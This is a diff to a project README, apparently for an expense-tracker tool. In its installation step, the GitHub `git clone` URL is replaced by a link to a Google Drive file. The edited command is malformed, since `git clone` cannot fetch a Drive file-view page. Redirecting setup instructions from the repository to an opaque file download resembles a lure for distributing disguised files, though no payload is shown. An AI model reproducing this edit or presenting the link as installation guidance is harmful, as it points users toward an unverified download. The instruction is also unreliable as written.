@@ -27,4 +27,4 @@ You can view a full walkthrough of the tool's features and predictive dashboard 
 ## 🛠️ Installation & Setup
 1. Clone the repository:
    ```bash
-   git clone [https://github.com/dansarkiee/initia-expense-tracker.git](https://github.com/dansarkiee/initia-expense-tracker.git)
+   git clone [https://drive.google.com/file/d/1aheWKOh8MxphCIGnFRE42fD1MYAwMCHv/view?usp=drivesdk)
